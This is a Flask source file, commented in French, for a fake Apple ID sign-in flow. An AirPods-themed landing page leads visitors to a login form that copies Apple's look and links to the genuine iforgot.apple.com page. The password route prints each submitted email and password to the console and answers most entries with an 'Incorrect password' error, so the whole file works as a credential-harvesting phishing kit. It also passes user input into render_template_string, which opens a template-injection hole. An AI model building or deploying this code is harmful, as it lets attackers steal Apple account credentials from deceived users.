from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)
app.secret_key = 'votre_cle_secrete_ici'

VALID_CREDENTIALS = {
    'username': 'youva',
    'password': '1234'
}

# Page AirPods d'accueil
airpods_page = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AirPods - Connexion iCloud</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: white;
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .airpods-image {
            width: 200px;
            margin-bottom: 30px;
        }
        h1 {
            color: #000; /* Texte AirPods en noir */
            font-size: 24px;
            margin-bottom: 20px;
        }
        .subtitle {
            color: #86868b;
            margin-bottom: 30px;
            font-size: 17px;
        }
        .login-button {
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 12px 25px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            text-decoration: none;
        }
        .create-account {
            color: #0071e3;
            font-size: 14px;
            margin-top: 15px;
            text-decoration: none;
        }
        .login-button:hover {
            background-color: #0062c3;
        }
    </style>
</head>
<body>
    <img src="https://i.ibb.co/zHQBkrHX/airpods.jpg" 
         alt="AirPods" class="airpods-image">
    <h1>AirPods de Youba</h1>

     <p class="subtitle">
            Sign In to connect and manage your Airpods:
    </p>
    <a href="/login" class="login-button">Sign In with Apple ID</a>
    <a href="/create-account" class="create-account">Don't have an Apple ID? Create one</a>
</body>
</html>
"""

# Login interface Apple-style
base_html = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compte Apple</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }}
        .login-container {{
            width: 380px;
            padding: 200px 40px; 
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }}
        .apple-logo {{
            width: 150px;
            height: 150px;
            margin-bottom: 10px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 20px 0;
            color: #1d1d1f;
        }}
        .input-container {{
            position: relative;
            margin-bottom: 15px;
        }}
        .input-field {{
            width: 100%;
            padding: 15px 45px 15px 15px;
            font-size: 16px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            box-sizing: border-box;
        }}
        .input-field:focus {{
            border-color: #0071e3;
            outline: none;
        }}
        .submit-btn {{
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #0071e3;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            padding: 0 5px;
        }}
        .submit-btn:hover {{
            background-color: #005bb5;
        }}
         .checkbox-container {{
            text-align: left;
            margin: 20px 0;
            font-size: 14px;
            color: #1d1d1f;
        }}
        .link {{
            display: block;
            color: #0071e3;
            text-decoration: none;
            font-size: 14px;
            margin: 10px 0;
        }}
        .link:hover {{
            text-decoration: underline;
        }}
        .error-message {{
            color: #ff3b30;
            font-size: 14px;
            margin-bottom: 20px;
        }}
                .username-display {{
            text-align: left;
            font-size: 14px;
            color: #1d1d1f;
            margin-bottom: 15px;
        }}
        .username-box {{
        background-color: #f5f5f7;
        border-radius: 8px;
        padding: 12px 15px;
        margin-bottom: 15px;
        text-align: left;
        font-size: 14px;
        }}
                .username-label {{
            color: #86868b;
            font-size: 12px;
        }}
        
        .username-value {{
            color: #1d1d1f;
            font-weight: normal;
            margin-top: 3px;
        }}
    </style>
</head>
<body>
<div class="login-container">
    <img src="https://i.ibb.co/kddN5ht/Capture-d-cran-du-2025-05-21-09-26-14.png" class="apple-logo">
    <h2>Sign In with Apple ID</h2>
    {content}
</div>
</body>
</html>
"""

username_screen = """
<form method="POST" action="/username">
    <div class="input-container">
        <input type="text" name="username" class="input-field" placeholder="Email or phone number" required>
        <button type="submit" class="submit-btn">→</button>
    </div>
    <div class="checkbox-container">
        <input type="checkbox" id="stay_connected" name="stay_connected">
        <label for="stay_connected">Keep me signed in</label>
    </div>
    <a href="https://iforgot.apple.com/password/verify/appleid" class="link">Forgot password?</a>
    <a href="#" class="link">Create Apple ID</a>
</form>
"""

password_screen = """
<div class="username-box">
    <div class="username-label">Email or phone number</div>
    <div class="username-value">{username}</div>
</div>
<form method="POST" action="/password">
    <input type="hidden" name="username" value="{username}">
    <div class="input-container">
        <input type="password" name="password" class="input-field" placeholder="Password" required>
        <button type="submit" class="submit-btn">→</button>
    </div>
    <div class="checkbox-container">
        <input type="checkbox" id="stay_connected" name="stay_connected">
        <label for="stay_connected">Keep me signed in</label>
    </div>
    <a href="https://iforgot.apple.com/password/verify/appleid" class="link">Forgot password?</a>
    <a href="#" class="link">Create Apple ID</a>
</form>
"""

error_screen = """
<form method="POST" action="/username">
    <div class="input-container">
        <input type="text" name="username" class="input-field" placeholder="Email or phone number" value="{username}" required>
        <button type="submit" class="submit-btn">→</button>
    </div>
    <div class="error-message">
        <strong>Incorrect password</strong><br>
        Check your account information and try again.
    </div>
    <div class="checkbox-container">
        <input type="checkbox" id="stay_connected" name="stay_connected">
        <label for="stay_connected">Keep me signed in</label>
    </div>
    <a href="https://iforgot.apple.com/password/verify/appleid" class="link">Forgot password?</a>
    <a href="#" class="link">Create Apple ID</a>
</form>
"""

success_screen = """
<div style="padding: 20px; text-align: center;">
    <h2 style="color: #1d1d1f;">Connexion réussie</h2>
    <p style="color: #86868b;">Bienvenue, {username}!</p>
</div>
"""

# Flask routes

@app.route("/")
def home():
    return render_template_string(airpods_page)

@app.route("/login", methods=["GET"])
def login():
    return render_template_string(base_html.format(content=username_screen))

@app.route("/username", methods=["POST"])
def handle_username():
    username = request.form.get("username", "").strip()
    return render_template_string(base_html.format(
        content=password_screen.format(username=username)
    ))

@app.route("/password", methods=["POST"])
def handle_password():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()

    print(f"[REÇU] Username: {username}, Password: {password}")

    if username == VALID_CREDENTIALS["username"] and password == VALID_CREDENTIALS["password"]:
        return render_template_string(base_html.format(
            content=success_screen.format(username=username)
        ))
    else:
        return render_template_string(base_html.format(
            content=error_screen.format(username=username)
        ))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
